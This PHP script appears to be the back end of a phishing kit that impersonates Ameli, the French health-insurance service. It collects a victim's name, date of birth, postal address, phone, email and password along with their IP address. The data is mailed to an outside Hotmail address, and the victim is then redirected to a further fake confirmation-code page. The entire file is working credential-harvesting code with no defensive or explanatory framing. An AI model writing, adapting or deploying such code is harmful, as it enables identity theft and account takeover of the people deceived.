<?
$date = date("H:i:s | d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
$message .= "-------------------------------\n";       
$message .= "nom   : ".$_POST['nom']."\n";
$message .= "prenom   : ".$_POST['prenom']."\n";
$message .= "date de naissance   : ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "Adresse   : ".$_POST['adresse']."\n";
$message .= "Adresse2   : ".$_POST['adresse2']."\n";
$message .= "Ville   : ".$_POST['ville']."\n";
$message .= "Code postal   : ".$_POST['cp']."\n";
$message .= "Telephone    : ".$_POST['tel']."\n";
$message .= "Mail   : ".$_POST['mail']."\n";
$message .= "Pwd   : ".$_POST['Pwd']."\n";
$message .= "-------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$to = "fj@hotmail.fr";
$subj = "Ameli|".$ip."\n";
$from = "From: Ameli Login assuance<me>";
mail($to, $subj, $message, $from);

@header("Location: index_3.html?_nfpb=true&_pageLabel=as_demande_code_conf_page&premiereDemande=FALSE")
?>